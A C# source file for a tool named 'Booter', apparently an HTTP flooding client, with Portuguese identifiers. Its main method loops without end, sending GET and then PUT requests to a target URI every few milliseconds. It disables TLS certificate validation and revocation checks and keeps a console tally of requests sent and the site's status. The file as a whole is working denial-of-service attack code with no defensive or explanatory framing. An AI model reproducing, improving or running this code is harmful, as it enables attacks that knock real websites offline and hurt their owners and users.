using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Booter
{
    public class Client
    {
        private HttpClient _client;
        public static int enviados;

        public Client(HttpClient client)
        {
            _client = client;
        }

        public static bool ServerCertificateValidationCallback(
          object sender,
          X509Certificate certificate,
          X509Chain chain,
          SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }

        public async void Get(string uri)
        {
            int num;
            while (true)
            {
                num = 0;
                try
                {
                    ServicePointManager.CheckCertificateRevocationList = false;
                    ServicePointManager.Expect100Continue = false;
                    ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                    ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(ServerCertificateValidationCallback);

                    HttpResponseMessage html = await _client.GetAsync(uri);

                    if (html.IsSuccessStatusCode)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                    }

                    ++enviados;
                    string cnt = html.Headers.Connection.ToString();
                    Console.Write($"\r[{char.ToUpper(cnt[0]) + cnt.Substring(1)}] {enviados} | Status do site: {html.StatusCode}                     ");
                    
                    string titulo = " - ";
                    try
                    {
                        titulo = Regex.Match(html.Content.ReadAsStringAsync().Result, "<title>(?<Title>[^<]+)").Groups["Title"].Value.Trim();
                    }
                    catch { }

                    Console.Title = $"[{enviados}] {html.StatusCode} {titulo}";

                    if (html.Content.ReadAsStringAsync().Result != null)
                    Debug.WriteLine(html.Content.ReadAsStringAsync().Result);

                    html = await _client.PutAsync(uri, html.Content);
                    await Task.Delay(5);
                }
                catch
                {
                    num = 1;
                    break;
                }
            }
            if (num == 1)
            {
                await Task.Delay(1);
            }
        }
    }
}
